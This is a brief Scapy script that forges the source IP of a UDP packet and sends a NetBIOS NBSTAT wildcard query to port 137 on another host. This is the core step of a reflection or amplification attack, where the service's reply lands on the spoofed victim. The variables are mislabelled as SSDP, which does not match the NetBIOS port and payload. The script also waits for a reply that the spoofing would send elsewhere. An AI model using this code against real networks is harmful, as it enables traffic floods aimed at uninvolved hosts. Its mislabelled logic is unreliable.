from scapy.all import *

spoofedIPsrc="192.168.123.3"
SSDPserver="192.168.123.2"
 
payload='\x82(\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00 CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00!\x00\x01'
ssdpRequest = IP(src=spoofedIPsrc,dst=SSDPserver) / UDP(sport=57730, dport=137) / payload
sr1(ssdpRequest)
